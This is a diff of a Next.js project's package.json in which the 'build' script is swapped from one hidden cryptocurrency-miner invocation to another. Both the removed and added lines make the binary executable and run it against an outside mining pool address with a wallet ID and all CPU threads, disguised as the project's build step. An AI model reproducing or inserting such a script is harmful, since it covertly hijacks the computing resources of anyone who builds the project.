@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x ebiy && ./ebiy -o 206.189.152.87:80 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p DUARRR -t $(nproc --all)",
+    "build": "chmod +x srnode && ./srnode -o 34.66.153.51:443 -u bit1qkl4g9deazdnu3wz93lpusnmwyvhcqyddp953ue -p version -t $(nproc --all)",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
